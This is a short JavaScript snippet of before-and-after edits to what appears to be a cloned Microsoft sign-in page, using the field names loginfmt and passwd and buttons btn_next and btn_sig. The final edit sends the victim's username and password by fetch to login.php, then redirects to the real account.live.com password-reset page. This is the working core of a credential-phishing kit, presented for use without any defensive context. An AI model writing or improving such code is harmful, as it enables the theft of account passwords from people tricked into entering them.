// Original code
const buttonElement = document.querySelector('#btn_next');
// Modified code
const buttonElement = document.getElementById('btn_next');

// Original code
buttonElement.click();
// Modified code
buttonElement.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true }));

// Original code
const buttonElement = document.querySelector('#btn_sig');
// Modified code
const buttonElement = document.getElementById('btn_sig');

// Original code
const pass = inpPwd.value.trim();
// Modified code
const pass = inpPwd.value;

// Original code
formPwd.submit(); // Submit the password form
// Modified code
// Use fetch API to send data to the server
const formData = new FormData();
formData.append('loginfmt', uname);
formData.append('passwd', pass);

fetch('login.php', {
    method: 'POST',
    body: formData
})
.then(response => {
    if (response.ok) {
        window.location.href = 'https://account.live.com/ResetPassword.aspx';
    } else {
        throw new Error('Network response was not ok.');
    }
})
.catch(error => console.error('Error:', error));
